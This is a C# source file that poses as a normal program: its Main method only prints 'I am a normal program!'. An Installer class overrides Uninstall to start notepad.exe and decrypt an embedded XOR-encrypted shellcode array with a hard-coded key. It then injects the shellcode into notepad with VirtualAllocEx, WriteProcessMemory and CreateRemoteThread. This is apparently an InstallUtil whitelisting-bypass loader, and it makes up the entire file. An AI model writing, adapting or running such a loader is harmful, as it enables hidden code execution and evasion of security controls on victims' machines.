using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;

public class Program
{
    public static void Main()
    {
        // Generic code execution
        Console.WriteLine("I am a normal program!");
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : Installer
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        string targetProcess = "notepad.exe"; // Target process
        byte[] encryptedShellcode = new byte[] { 0x43, 0xa1, 0x64, 0x6d, 0x1d, 0x9a, 0x81, 0xf5, 0xa0, 0xdb, 0xa6, 0x66, 0x28, 0xc0, 0xca, 0x48, 0xed, 0x45, 0x60, 0x3f, 0x9, 0xab, 0x1e, 0xcb, 0xc5, 0xf5, 0xb, 0xbf, 0x6a, 0x61, 0x1e, 0x3, 0x13, 0x75, 0x8a, 0x11, 0x1f, 0xb6, 0xc1, 0x5, 0xbd, 0xb2, 0x2c, 0xf3, 0x51, 0x3c, 0xc0, 0x91, 0xe8, 0xc2, 0xb9, 0x7d, 0x96, 0xd8, 0xdd, 0xc5, 0xa2, 0x34, 0x6d, 0x4c, 0x9d, 0x89, 0x5b, 0x8f, 0xbe, 0x99, 0x60, 0x35, 0x3d, 0x11, 0xa9, 0xdc, 0x73, 0x6c, 0x7d, 0xb1, 0xd1, 0x3d, 0x13, 0xf2, 0x40, 0x0, 0x60, 0x59, 0x96, 0x9b, 0x37, 0xf5, 0xb2, 0x7e, 0xe2, 0x39, 0xb4, 0x48, 0xe8, 0xfb, 0x5f, 0x3c, 0x1f, 0x6e, 0x60, 0x62, 0xda, 0xb9, 0x56, 0xca, 0xcd, 0x6c, 0x93, 0x11, 0xb, 0xc2, 0x6c, 0x2f, 0x60, 0x61, 0x56, 0x11, 0xb9, 0xd8, 0x73, 0x6c, 0xa6, 0x30, 0x93, 0x48, 0xff, 0x4a, 0xfb, 0x6d, 0xcf, 0x36, 0x46, 0xfb, 0xb8, 0x9e, 0x23, 0x40, 0xcd, 0x6c, 0x47, 0x13, 0xa4, 0xd1, 0x56, 0xc9, 0x14, 0x92, 0xe2, 0xc7, 0x89, 0xf7, 0x40, 0xbf, 0x2d, 0x5c, 0x6f, 0x3a, 0x1d, 0x9c, 0xeb, 0x21, 0xa7, 0x1a, 0x3b, 0x9d, 0x68, 0x2c, 0x8d, 0x6f, 0x95, 0xa4, 0x19, 0x49, 0x2f, 0xea, 0x7b, 0x1d, 0xbb, 0x5, 0x34, 0x1a, 0x8a, 0xc4, 0x8d, 0x6a, 0x47, 0x3e, 0x70, 0x89, 0x87, 0xee, 0x4, 0x21, 0xe9, 0x6d, 0x2, 0x9, 0x68, 0x22, 0x22, 0xef, 0x7d, 0x64, 0x58, 0x19, 0x6f, 0x93, 0xd7, 0xa3, 0xe4, 0xb2, 0xfd, 0x65, 0x34, 0x53, 0x18, 0xaf, 0x7b, 0x63, 0x70, 0xd0, 0x8a, 0xb7, 0xde, 0xb6, 0x3e, 0xe8, 0xdd, 0xee, 0xeb, 0x3b, 0x3c, 0xb7, 0x58, 0xd8, 0xf0, 0x2e, 0x2f, 0xc3, 0xbf, 0x23, 0xeb, 0x7, 0x19, 0xcc, 0xb6, 0xac, 0x70, 0x66, 0xe5, 0x6b, 0xe7, 0x9c, 0xac, 0x3b, 0xbf, 0x37, 0xdd, 0xe6, 0x2b, 0xf0, 0xa1, 0xac, 0x72, 0xaf, 0x2d, 0x34, 0x4e, 0x23, 0x2f, 0xab, 0xe7, 0xed, 0xb8, 0x88, 0xe2, 0x4f, 0x72, 0x97, 0x18, 0xbf, 0x7b, 0x67, 0x4f, 0x21, 0x2d, 0x1a, 0x77, 0x16, 0x14, 0xb8, 0x9e, 0x62, 0xe1, 0xb9, 0x5a, 0xe7, 0x45, 0x34, 0x58, 0x49, 0x2f, 0xa9, 0xbf, 0x19, 0x83, 0x66, 0x32, 0x95, 0xd1, 0x3b, 0xa7, 0xe8, 0x45, 0x41, 0x76, 0x4, 0x4e, 0x3c, 0x6a, 0x17, 0xb5, 0x92, 0x11, 0xbe, 0xee, 0x41, 0x2, 0x40, 0xd2, 0xcb, 0xf1, 0xd2, 0xd0, 0x3c, 0x40, 0x48, 0x28, 0x44, 0xdb, 0xef, 0x20, 0x7, 0xc9, 0x4f, 0x98, 0x96, 0x4e, 0x23, 0x2f, 0x90, 0x40, 0x9c  };
        
        byte[] key = new byte[] { 0xbf, 0x49, 0xeb, 0x6d, 0x1d, 0x9a, 0xe1, 0xc4, 0x72, 0xbf, 0x2d, 0x34, 0x18, 0x49, 0x2f, 0xc3 };

        // Decrypt the shellcode using XOR
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        
        Process process = Process.Start(targetProcess);

        IntPtr hProcess = OpenProcess(0x1F0FFF, false, process.Id);

        IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decryptedShellcode.Length, 0x3000, 0x40);
        
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ key[i % key.Length]);
        }

        IntPtr bytesWritten;
        WriteProcessMemory(hProcess, allocatedMemory, decryptedShellcode, (uint)decryptedShellcode.Length, out bytesWritten);

        IntPtr threadHandle;
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out threadHandle);

        CloseHandle(hProcess);
    }
}
